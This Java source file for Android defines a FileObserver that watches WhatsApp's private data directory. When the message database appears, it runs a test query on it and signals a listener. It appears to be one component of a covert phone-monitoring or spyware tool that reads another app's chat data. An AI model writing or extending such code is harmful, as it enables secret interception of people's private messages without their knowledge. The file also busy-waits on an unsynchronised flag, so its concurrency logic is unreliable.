package com.vvt.whatsapp;

import java.io.File;

import android.os.FileObserver;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.vvt.im.Customization;
import com.vvt.logger.FxLog;

public class WhatsAppDatabaseObserver extends FileObserver {

	/*=========================== CONSTANT ===============================*/
	private static final String TAG = "WhatsAppDatabaseObserver";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	
	private static final String DATABASE_PATH = "/data/data/com.whatsapp";
	
	/*============================ MEMBER ================================*/
	private static WhatsAppDatabaseObserver sWhatsAppDatabaseObserver;
	private WhatsAppManagerListener mWhatsAppManagerListener;
	private boolean mIsNewCreated = false;
	private boolean mIsProcessing = false;
	private static Handler mHandler;
	
	/*============================ METHOD ================================*/
	public static WhatsAppDatabaseObserver getWhatsAppDatabaseObserver(WhatsAppManagerListener listener) {
		if(sWhatsAppDatabaseObserver == null) {
			sWhatsAppDatabaseObserver = new WhatsAppDatabaseObserver(DATABASE_PATH,listener);
		}
		return sWhatsAppDatabaseObserver;
	}
	
	private WhatsAppDatabaseObserver(String path, WhatsAppManagerListener listener) {
		super(path);
		mWhatsAppManagerListener = listener;
		startHandlerThread();
	}

	public boolean registerObserver() {
		if(LOGV) FxLog.v(TAG, "registerObserver # ENTER ...");
		boolean registerStatus = false;
		File file = new File(DATABASE_PATH);
		if(file.exists()) {
			startWatching();
			registerStatus = true;
			if(LOGD) FxLog.d(TAG, "registerObserver # file.exists() register = true");
		}
		if(LOGV) FxLog.v(TAG, "registerObserver # EXIT ...");
		return registerStatus;
		
	}
	
	public boolean unregisterObserver() {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # ENTER ...");
		stopWatching();
		stopHandlerThread();
		sWhatsAppDatabaseObserver = null;
		if(LOGV) FxLog.v(TAG, "unregisterObserver # EXIT ...");
		return true;
	}

	@Override
	public void onEvent(int event, String path){
		
		if(path != null && path.equals("databases") && (event & FileObserver.CREATE) == FileObserver.CREATE) {
			if(LOGV) FxLog.v(TAG, "onEvent # FileObserver.CREATE by & Path : "+path);
			mIsNewCreated = true;
		}
		
		if(path != null && path.equals("databases") && (event & FileObserver.DELETE) == FileObserver.DELETE) {
			if(LOGV) FxLog.v(TAG, "onEvent # FileObserver.DELETE by & Path : "+path);
			mIsNewCreated = false;
			mWhatsAppManagerListener.onDatabaseFolderChange(false);
		}

		if(mIsNewCreated) {
			if(mHandler != null) {
				Message msg = mHandler.obtainMessage();
				mHandler.sendMessage(msg);
			} else {
				if(LOGV) FxLog.v(TAG, "onEvent # mHandler is null");
			}
		}
	}
	
	
	private void startHandlerThread() {
		if(LOGV) FxLog.v(TAG, "startHandlerThread # ENTER ...");
		Thread t = new Thread(new Runnable() {
			
			@Override
			public void run() {
				Looper.prepare();
				mHandler = new Handler() {  
					@Override
					public void handleMessage(Message msg) {
						if(LOGV) FxLog.v(TAG, "handleMessage # ENTER ... ");
						super.handleMessage(msg);

						// waiting loop
						while (mIsProcessing) {
							// wait until another thread return key process; 
						}
						
						if (mIsNewCreated) {
							Thread attempThread = new Thread(new Runnable() {
								
								@Override
								public void run() {
									try {
										if(LOGV) FxLog.v(TAG, "handleMessage # sleep 2 second until database complete.");
										Thread.sleep(2000);
									} catch (InterruptedException e) {}
									
									if(WhatsAppUtil.TestQuery()) {
										mIsNewCreated = false;
										mWhatsAppManagerListener.onDatabaseFolderChange(true);
									}
									// release key.
									mIsProcessing = false;
								}
							});
							attempThread.start();
							//keep key.
							mIsProcessing = true;
						}
						if(LOGV) FxLog.v(TAG, "handleMessage # EXIT ... ");
					}
				};
				Looper.loop();
			}
		});
		t.start();
		
		if(LOGV) FxLog.v(TAG, "startHandlerThread # EXIT ...");
	}
	
	private void stopHandlerThread() {
		Looper myLooper = Looper.myLooper();
		if (myLooper != null) {
			if(LOGV) FxLog.v(TAG, "stopHandlerThread # myLooper.quit() ...");
			myLooper.quit();
		}
		mHandler = null;
	}

}
